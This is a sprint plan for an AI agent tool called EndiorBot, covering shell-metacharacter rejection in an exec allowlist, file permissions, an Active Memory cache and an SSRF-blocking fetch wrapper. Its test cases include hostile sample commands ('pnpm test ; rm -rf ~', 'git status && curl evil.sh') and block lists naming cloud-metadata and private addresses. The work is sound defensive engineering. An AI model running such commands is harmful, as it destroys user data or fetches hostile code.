---
sprint: 133
status: PLANNED — Awaiting CEO kickoff
start_date: TBD
planned_duration: 4–5 days
framework: "6.3.0"
authority: "Plan v3 SHOULD items (CTO G2 APPROVED 2026-04-11) + CEO Decisions Locked"
feature_prd: "docs/01-planning/openclaw-backport/PRD.md"
scope_doc: "docs/01-planning/openclaw-backport/scope.md"
previous_sprint: "Sprint 132 — openclaw Backport M0+M1 (COMPLETE 2026-04-11, CTO 9.5/10)"
carryover: ["allowlist-pattern.ts shell metachar fix (CTO automated review #1)", "store.ts 0o600 permissions (CTO automated review #3)"]
---

# Sprint 133 — Active Memory + SSRF Audit + Sprint 132 Security Carryover

## Context

Sprint 132 shipped M0 (cmd.list RPC) and M1 (exec-policy cluster) — both MUST items from the openclaw-backport plan v3. Sprint 133 targets the two SHOULD items: **S1** (Active Memory per-query context refresh) and **S2** (native fetch SSRF audit). Plus two security carryover items from the Sprint 132 automated CTO code review.

**Identity guard:** All items pass CEO Power Tool (LOCKED) filter. No platform creep.

---

## Locked Scope — 4–5 Days

| # | Item | Ref | Effort | Priority | Blocker |
|---|------|-----|--------|----------|---------|
| 1 | **Sprint 132 security carryover** — 2 targeted fixes | CTO review findings #1, #3 | 0.25d | P0 | None |
| 2 | **S1 — Active Memory** sub-agent with cache-first, model-call-fallback | PRD §3 S1 | 2–3d | P1 | Feature flag pattern (exists) |
| 3 | **S2 — Native fetch SSRF audit** + allowlist/blocklist layer | PRD §3 S2 | 1–1.5d | P1 | None |

**Total:** 3.25–4.75 days. Fits a 4–5 day sprint.

---

## Task Breakdown

### Task 1 — Sprint 132 security carryover (0.25 day, P0 — do first)

Two targeted fixes from the automated CTO code review (8.5/10 review, Finding #1 + #3). Both non-blocking for Sprint 132 scope but should ship before S1/S2 work begins.

**1a. Shell metacharacter detection + rejection (architecture-correct split)**
- **Files:** `src/security/exec-approvals/allowlist-pattern.ts` (detection helper) + `src/security/exec-approvals/check.ts` (decision logic)
- **Issue:** `*` compiles to `.*` regex in `allowlist-pattern.ts` line 60, matching shell metacharacters (`;`, `|`, `` ` ``, `$()`). Latent bypass when fine-grained tool-use dispatcher wires in.
- **Fix (respecting module boundaries per CPO condition #2):**
  - In `allowlist-pattern.ts`: add a pure detection helper `containsShellMetachars(command: string): boolean` that returns `true` if the command contains `;`, `|`, `&&`, `||`, `` ` ``, `$()`, `>(`, `<(`. This is a **matcher-level concern** — no decision logic here.
  - In `check.ts`: call `containsShellMetachars(command)` **before** allowlist pattern matching. If true → return `ExecPolicyDecision` with `decision: "deny"`, `reason: "shell-metachar-rejected"`. Decision logic stays in `check.ts` where it belongs.
- **Tests:** `echo foo | cat` → deny, `pnpm test ; rm -rf ~` → deny, `git status && curl evil.sh` → deny, backtick subshell → deny, clean command `pnpm test` → passes through to normal flow.
- **Alternative:** If rejection is too aggressive for M1 coarse-hook semantics, document explicitly in a code comment + add a test demonstrating the limitation. CEO decides which approach.

**1b. File permissions on exec-policy store (CPO condition #3: behavior-based acceptance)**
- **File:** `src/security/exec-approvals/store.ts` line 103
- **Fix:** Ensure the **persisted** `approvals.json` file has mode `0o600` (owner read/write only). Implementation: set `mode: 0o600` on `writeFileSync` for the tmp file; `renameSync` preserves the mode from the source file. Mirrors existing pattern in `src/bridge/agent-launcher.ts:200`.
- **Test:** Assert the **persisted file's actual mode** is `0o600` (behavior-based, not implementation-based). Read with `fs.statSync(storePath).mode & 0o777` and assert `=== 0o600`.

### Task 2 — S1: Active Memory sub-agent (2–3 days, P1)

**Goal:** Per-query context-fetcher that injects recent context before the main agent reply. Cache-first, model-call-fallback pattern. **The 15s cache is the mandatory part — the sub-agent is the optional part.** (Plan v3)

**Hard preconditions (abort feature if not met — CEO-locked 2026-04-11):**
1. Inject budget ≤ **500 tokens**
2. Cache-hit latency ≤ **50 ms**
3. Cache-miss (sub-agent) latency ≤ **300 ms**
4. **Circuit breaker** on sub-agent timeout (fail-open — deliver main reply without context)
5. **Kill switch** via feature flag (`activeMemory.enabled` = `false` reverts instantly)
6. Cache TTL default **15s**, configurable 1–120s

**Kill-switch ownership:** CEO only. No automatic p95-threshold auto-disable. CEO flips config or CLI.

**Token estimation (CPO medium finding):** The ≤500 token guard uses `Math.ceil(content.length / 4)` as a conservative character-to-token ratio (standard GPT/Claude approximation). This is a heuristic, not a tokenizer call — acceptable for a budget guard where ±20% variance is tolerable. Tests assert against this same estimator so the PoL is internally consistent. If a future sprint adds a real tokenizer (tiktoken, anthropic-tokenizer), the guard can switch to it without changing the interface.

**Integration points (verified by Explore agent 2026-04-11):**

| Integration | File | Line | Notes |
|---|---|---|---|
| Pre-dispatch hook | `src/bus/consumer.ts` | ~140 (`_process()`) | S1 inserts before `ingress.handleInbound()`. No pre-dispatch middleware chain exists today — S1 creates the pattern. |
| Brain L4 (read-only) | `src/brain/layers/mental-models.ts` | interface | `getAllModels()`, `getModelsByDomain()`, `getFormattedRules()`. S1 can call these for enrichment. L4 loads once at session start via `brain-loader.ts:44-71`. |
| Feature flag | `src/config/feature-flags.ts` | ~37–115 | Pattern exists. Add `ACTIVE_MEMORY_ENABLED` with env override `ENDIORBOT_FF_ACTIVE_MEMORY_ENABLED`. Use `isFeatureEnabled("ACTIVE_MEMORY_ENABLED")` for kill switch. |
| S1 module location | `src/agents/intelligence/` | directory exists | Lives alongside `patch-budget.ts`, `patch-intent-classifier.ts`, `workspace-context.ts`. New file: `active-memory.ts`. |

**openclaw reference (pattern only — `/Users/dttai/Documents/Python/01.NQH/openclaw/extensions/active-memory/`):**
- Entry: `index.ts` (50K LoC — large; we port the pattern, not the code)
- Query modes: `message` (latest only), `recent` (small tail), `full` (entire conversation) — config lines 31–34
- Cache TTL: `DEFAULT_CACHE_TTL_MS = 15_000` (15s) — configurable 1–120s
- Timeout: `DEFAULT_TIMEOUT_MS = 15_000` (blocking sub-agent) — schema min 250ms
- Turn counts: `recentUserTurns`, `recentAssistantTurns` (lines 22–23) — separate from L4

**Subtasks:**

| # | Subtask | Scope |
|---|---|---|
| 2a | **Feature flag + config** — add `ACTIVE_MEMORY_ENABLED` to feature-flags.ts + config schema with `cacheTtlMs` (default 15000, range 1000–120000), `timeoutMs` (default 15000, min 250), `maxInjectTokens` (default 500), `queryMode` (default `"recent"`) | ~50 LoC |
| 2b | **Cache layer** — in-memory `Map<sessionId, { content, timestamp }>` with TTL eviction. `getFromCache(sessionId)` returns hit/miss + latency. Cache-hit target ≤ 50ms. | ~80 LoC |
| 2c | **Context fetcher** — `fetchActiveMemoryContext(session, queryMode)` reads recent turns from session history + optionally calls Brain L4 `getFormattedRules()` for enrichment. Returns `{ content: string, tokenCount: number }`. Truncates at `maxInjectTokens`. | ~120 LoC |
| 2d | **Sub-agent wrapper** (optional fallback) — wraps context fetcher with timeout + circuit breaker. On timeout/failure → fail-open (return empty context, log breaker event). Circuit breaker: open after 3 consecutive failures, half-open after 30s, auto-close on success. | ~100 LoC |
| 2e | **Pre-dispatch hook + metadata contract (CTO C-SOFT-1)** — insert into `BusConsumer._process()` before `ingress.handleInbound()`. If `isFeatureEnabled("ACTIVE_MEMORY_ENABLED")`: fetch context (cache-first → sub-agent fallback), inject as `metadata.activeMemoryContext: ActiveMemoryPayload` on `BusInboundMessage`. If disabled: no-op. **Interface `ActiveMemoryPayload { content: string; tokenCount: number; source: "cache" \| "sub-agent" \| "none" }`** defined in S1 types. Downstream `ingress.handleInbound()` reads `metadata.activeMemoryContext` if present and prepends to agent context. Contract is explicit so integration is not fragile. | ~60 LoC |
| 2f | **Tests** — unit tests for cache (TTL eviction, hit/miss latency), context fetcher (token truncation, query modes), circuit breaker (open/half-open/close transitions, fail-open behavior), pre-dispatch hook (enabled/disabled, cache hit path, cache miss path, timeout → fail-open), kill switch (feature flag off → bypass). **PoL probe:** A/B latency test — p95 delta ≤ 10% between enabled (cache-warm) and disabled. | ~300 LoC |

**Total S1 estimate:** ~700 LoC incl. tests.

**PoL probe (required for merge):**
- Cache-hit path: latency ≤ 50ms, injected tokens ≤ 500
- Cache-miss path: latency ≤ 300ms (with mock sub-agent)
- Timeout path: circuit breaker opens, main reply still delivers
- Kill switch: `ENDIORBOT_FF_ACTIVE_MEMORY_ENABLED=false` → no context injected, zero latency delta
- A/B: p95 latency delta ≤ 10% between enabled (warm cache) and disabled

### Task 3 — S2: Native fetch SSRF audit (1–1.5 days, P1)

**Goal:** Defense-in-depth on outbound fetch paths. Block private-IP / `file://` / cloud-metadata. **Must NOT false-positive on legitimate public API calls** (CPO condition).

**Integration points (verified by Explore agent 2026-04-11, corrected per CPO condition #1):**
- **`fetch()` calls across 4 provider files:** `src/providers/openai/index.ts`, `src/providers/anthropic/anthropic-provider.ts`, `src/providers/github/index.ts`, `src/providers/gemini/index.ts`. Each provider has its own `fetchWithRetry()` method — no centralized HTTP client today.
- **No URL/IP allowlist exists today** — greenfield.
- `src/security/` has no fetch validation.

**Approach (CTO C-SOFT-2 resolved: centralized `safeFetch` — CTO recommended option B):**
Create `src/security/http-validator.ts` with `validateFetchUrl(url: string): void` that throws on private/blocked URLs. Then create `src/security/safe-fetch.ts` with `safeFetch(url: string, init?: RequestInit): Promise<Response>` that calls `validateFetchUrl(url)` before delegating to native `fetch()`. All 4 providers replace bare `fetch()` imports with `safeFetch`. **Single enforcement point** — prevents bypass if a future provider skips the check. No per-provider `fetchWithRetry()` injection needed (each provider's retry wrapper just calls `safeFetch` instead of `fetch`).

**Why centralized (CTO rationale):** 4 providers × separate injection = 4 integration points to maintain. Miss one → bypass. Centralized `safeFetch` wrapper = 1 enforcement point + 1 boundary test. Matches openclaw's pattern (centralized policy enforcement, not sprinkled checks).

**Subtasks:**

| # | Subtask | Scope |
|---|---|---|
| 3a | **URL validator** — `src/security/http-validator.ts`. Block: private IPv4 (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8, 169.254.0.0/16), private IPv6 (::1, fc00::/7, fe80::/10), `file://`, `ftp://`, cloud metadata endpoints (169.254.169.254, metadata.google.internal). Allow: `https://*` public, `http://localhost:*` only if `ENDIORBOT_DEBUG=true`. | ~120 LoC |
| 3b | **Redirect follower guard** — on redirect (301/302/307/308), re-validate the target URL before following. Public→private redirect blocked. Public→public allowed. | ~50 LoC |
| 3c | **Centralized `safeFetch` wrapper** — new `src/security/safe-fetch.ts` that calls `validateFetchUrl()` then delegates to native `fetch()`. Replace bare `fetch()` imports in 4 provider files with `safeFetch`. Add `tests/architecture/fetch-boundary.test.ts` that greps `src/providers/` for bare `fetch(` calls and asserts count is zero (boundary enforcement). | ~60 LoC (wrapper + 4 provider rewires + boundary test) |
| 3d | **Audit logging** — on block, write to `.endiorbot/audit-logs/ssrf-blocks.log` (JSONL, same rotation pattern as exec-policy). Fields: timestamp, url (scrubbed), reason, provider, session_id. | ~60 LoC |
| 3e | **Tests** — **Block-list tests:** private IP (all ranges), `file://`, cloud metadata, `0.0.0.0`, IPv6 loopback. **Allow-list tests (CPO condition):** `https://api.github.com/…`, public webhook endpoint, CDN fetch, public→public redirect chain. **False-positive regression:** ensure existing provider test suites still pass with validator active. | ~200 LoC |

**Total S2 estimate:** ~470 LoC incl. tests.

**PoL probe (required for merge):**
- Block: `fetch("http://169.254.169.254/latest/meta-data/")` → specific error code + audit log entry
- Allow: `fetch("https://api.github.com/zen")` → succeeds
- Redirect: public → private redirect → blocked
- Redirect: public → public → allowed
- Existing `pnpm test:security` still green
- **All 4 CPO false-positive guard cases pass**

---

## Success Criteria (Sprint-level)

- [ ] Sprint 132 carryover fixes shipped (allowlist-pattern hardening + store permissions)
- [ ] S1 shipped with all hard preconditions met (≤500 tokens, ≤50ms cache hit, ≤300ms cache miss, circuit breaker, kill switch, 15s TTL)
- [ ] S1 PoL probes pass (A/B latency ≤ 10% delta)
- [ ] S2 shipped with block-list + allow-list tests green
- [ ] S2 false-positive guard (4 CPO cases) all pass
- [ ] Zero regressions (7786+ tests green from Sprint 132)
- [ ] No new TypeScript errors under `exactOptionalPropertyTypes`
- [ ] CTO code review ≥ 8/10

---

## Review Conditions — ALL RESOLVED

| ID | From | Condition | Resolution |
|---|---|---|---|
| CPO #1 | CPO | Fix S2 baseline — actual fetch surface is 4 provider files, not "11 files" | ✅ Fixed: corrected to 4 named provider files with paths |
| CPO #2 | CPO | Task 1a — decision logic in `check.ts`, detection helper in `allowlist-pattern.ts` | ✅ Fixed: `containsShellMetachars()` helper in `allowlist-pattern.ts`, decision in `check.ts` |
| CPO #3 | CPO | Task 1b — behavior-based acceptance (mode `0o600` on persisted file) | ✅ Fixed: test asserts `statSync(storePath).mode & 0o777 === 0o600` |
| CTO C-SOFT-1 | CTO | S1 — define `ActiveMemoryPayload` interface + specify metadata injection field | ✅ Fixed: `ActiveMemoryPayload { content, tokenCount, source }` + `metadata.activeMemoryContext` contract |
| CTO C-SOFT-2 | CTO | S2 — centralized `safeFetch` (recommended) or bare injection + boundary test | ✅ Fixed: adopted centralized `safeFetch` + `fetch-boundary.test.ts` |

---

## Out of Sprint 133 Scope

- **C2 (Webhooks ingress)** → Sprint 134+ (Zapier + Email forward only, per CEO decision)
- **Per-agent preset override** → deferred from ADR-046 ambiguity #1 (CPO endorsed defer)
- **Fine-grained tool-use dispatcher** → future sprint (M1 coarse hook stays; Task 1a hardens it)
- **OTT→autonomous session wiring** → future sprint (per ADR-046 Amendment 1)
- Everything in the WON'T list (see scope.md)

---

## References

- [Plan v3 (CTO G2 APPROVED)](/Users/dttai/.claude/plans/glistening-nibbling-mist.md)
- [openclaw-backport PRD §3 S1 + S2](../../01-planning/openclaw-backport/PRD.md)
- [openclaw-backport scope](../../01-planning/openclaw-backport/scope.md)
- [ADR-046 (Autonomous Execution Policy)](../../02-design/01-ADRs/ADR-046-Autonomous-Execution-Policy.md)
- [Sprint 132 (prior)](./sprint-132-openclaw-backport.md)
- [CTO automated review findings #1, #3](Sprint 132 session — automated @cto code review)
- openclaw Active Memory: `/Users/dttai/Documents/Python/01.NQH/openclaw/extensions/active-memory/`

---

*EndiorBot | CEO Power Tool (LOCKED) | SDLC 6.3.0 | Sprint 133 Plan*
*Generated by @pm 2026-04-11*
